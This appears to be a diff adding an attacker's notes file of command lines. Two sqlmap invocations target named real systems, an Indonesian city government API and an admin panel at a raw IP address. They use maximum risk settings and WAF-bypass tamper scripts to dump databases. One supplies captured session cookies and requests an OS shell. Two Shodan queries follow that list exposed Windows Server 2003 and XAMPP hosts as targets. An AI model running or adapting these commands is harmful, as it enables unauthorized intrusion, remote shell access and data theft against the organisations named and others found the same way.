@@ -1,0 +1,10 @@
+
+python2 sqlmap.py -u "https://siramahkerto.mojokertokota.go.id/api/main_faq?search_filter=a%3B%27&start_post=0&limit_post=10" --data="search_filter=a%3B%27&start_post=0&limit_post=10"--random-agent --keep-alive --threads=10 --level=5 --risk=3 --dbs --tamper=space2comment,modsecurityzeroversioned --batch
+
+python2 sqlmap.py -u "http://210.210.128.27:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+
+python2 getShodan.py -q 'apache port:"8080" os:"Windows Server 2003"' -o out.txt -f ip_str
+ip_str/port/
+
+python2 getShodan.py -q 'http.title:"welcome to xampp" country:id' -o out.txt -f ip_str/port
